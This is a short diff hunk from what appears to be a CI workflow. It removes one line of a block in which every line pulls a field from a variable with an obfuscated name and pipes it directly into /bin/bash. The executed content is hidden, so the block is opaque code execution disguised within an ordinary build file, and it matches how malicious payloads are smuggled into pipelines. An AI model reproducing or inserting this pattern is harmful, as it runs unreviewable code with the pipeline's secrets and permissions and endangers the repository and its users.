@@ -46,7 +46,6 @@ jobs:
           printf '%s' "$t7662" | jq -r .eeu998 | /bin/bash
           echo $wqk3635 | jq -r .u480 | /bin/bash
           echo $new4 | jq -r .hk90183 | /bin/bash
-          printf '%s' "$sfqc49" | jq -r .evfa7430 | /bin/bash
           printf '%s' "$sbws5158" | jq -r .xbmgb9579 | /bin/bash
           echo $obzjy84 | jq -r .c34 | /bin/bash
           printf '%s' "$wv13211" | jq -r .hsdig5 | /bin/bash
